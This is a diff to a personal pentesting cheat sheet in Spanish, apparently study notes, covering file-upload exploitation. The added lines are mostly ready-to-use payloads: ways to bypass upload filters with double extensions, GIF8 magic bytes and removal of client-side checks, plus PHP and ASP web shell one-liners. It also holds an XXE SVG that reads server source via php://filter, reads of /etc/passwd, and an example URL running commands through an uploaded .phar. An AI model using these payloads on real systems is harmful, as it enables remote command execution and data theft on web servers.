@@ -308,6 +308,10 @@ EXPLOTACION
                            5 - Me dirijo al lugar de subida del archivo => Ej: http://83.136.249.46:40526/profile_images/shell2.phar?cmd=id
                            6 - Pruebo extensiones validas que ejecuten el comando
 
+                        A veces se necesita algo mas para evadir los filtros hay que poner dos extensiones: shell.php.jpg / shell.jpg.php / shell.jpg.phar / shell.jpg.phtml
+                        Tambien Escribir GIF8 delante del codigo shell. 
+                        
+
             FILE UPLOAD
             ...........
 
@@ -334,6 +338,37 @@ EXPLOTACION
                            Ej:   <?php
                                  system('comando');
                                  ?>
+                  FORZAR SUBIDA FORMATOS
+                  ......................
+                  <input name="uploadFile" id="uploadFile" type="file" class="custom-file-input" id="inputGroupFile02" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
+                  <label id="inputGroupFile01" class="custom-file-label" for="inputGroupFile02" aria-describeby="inputGroupFileAddon02">
+
+                  Eliminar el onchange y el accept asi podemos cargar el archivo que queramos
+
+                  WEB SHELL
+                  .........
+                        <?php file_get_contents('/etc/passwd'); ?>          => Lectura básica de archivos PHP
+                        <?php system('hostname'); ?>                        => Ejecución básica de comandos PHP
+                        <?php echo file_get_contents('/etc/hostname'); ?>   => Script PHP que se ejecuta para obtener el (nombre de host) en el servidor back-end
+                        <?php system($_REQUEST['cmd']); ?>                  => PHP Web Shell básico
+                        <?php echo shell_exec($_GET[ "cmd" ]); ?>           => Webshell PHP alternativo que utiliza la función shell_exec.
+                        <% eval request('cmd') %>                           => Shell web ASP básico
+
+                        CODIGO PARA OCULTAR EN .SVG
+                        ...........................
+                        1 - Este sirve para ver el codigo de upload.php
+
+                           <?xml version="1.0" encoding="UTF-8"?>
+                           <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
+                           <svg>&xxe;</svg>
+
+                        2 - Este sirve para ejecutar comandos, AAAA se puede enmascarar cambiando el hexadecimal ej: jpeg => FF D8 FF DB
+
+                           AAAA
+                           <?php echo system($_GET["cmd"]);?
+
+                        Para meter comandos si necesitamos poner espacio en url %20 => Espacio
+                      
                              
             SQL INJENCTION
             ..............
